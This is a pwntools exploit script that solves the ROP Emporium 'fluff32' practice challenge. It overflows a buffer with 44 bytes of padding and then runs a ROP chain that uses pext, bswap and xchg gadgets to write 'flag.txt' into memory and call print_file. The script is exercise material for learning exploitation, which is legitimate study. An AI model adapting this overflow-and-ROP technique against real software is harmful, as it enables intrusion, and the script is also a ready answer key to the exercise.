#!/usr/bin/env python3

"""
Solution to ROP Emporium fluff32
"""

from pwn import *   # import pwntools

context.log_level = "debug"   # Debugging information
context.binary = elf = ELF("./fluff32")    # Set architecture info
io = process()    # Create a process with the loaded elf
rop = ROP(elf)    # Create the ROP object
gdb.attach(io)

offset = 44
data_addr = elf.symbols.data_start

pop_ebx = p32(0x08048399)        # 0x08048399: pop ebx; ret; 
mov_eax = p32(0x0804854f)        # 0x0804854f: mov eax, 0xdeadbeef; ret;
set_reg = p32(0x0804854a)        # 0x0804854a: pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
mov_to_mem = p32(0x08048555)     # 0x08048555: xchg byte ptr [ecx], dl; ret; 
pop_ecx_bswap = p32(0x08048558)   # 0x08048558: pop ecx; bswap ecx; ret;    # need to load ecx in reverse to account for bswap

flag = b"flag.txt"
encoded_flag = ["\xc6\x00\x00\x00", "\xcc\x00\x00\x00", "\xc1\x00\x00\x00", "\xc7\x00\x00\x00", "\x4e\x00\x00\x00", "\xe4\x00\x00\x00", "\xe8\x00\x00\x00", "\xe4\x00\x00\x00"]

# Set eax
rop.raw([mov_eax])

for i in range(0,len(flag)):
    # reverse data_section address for bswap instr
    rev_data_addr = p32(data_addr + i, endian='big')

    # set destination
    rop.raw([pop_ecx_bswap, rev_data_addr])

    # Move the first letter into ebx, set eax with 0xdeadbeef and perform the pext
    rop.raw([pop_ebx, encoded_flag[i], set_reg])
    
    # Move letter to memory
    rop.raw([mov_to_mem])


rop.print_file(data_addr)
rop_chain = rop.chain()


payload = b""
payload += b"A" * offset
payload += rop_chain

write("payload.txt", payload)

io.recvuntil(b"> ")
io.sendline(payload)
io.recvuntil(b"Thank you!\n")
success(io.recv())
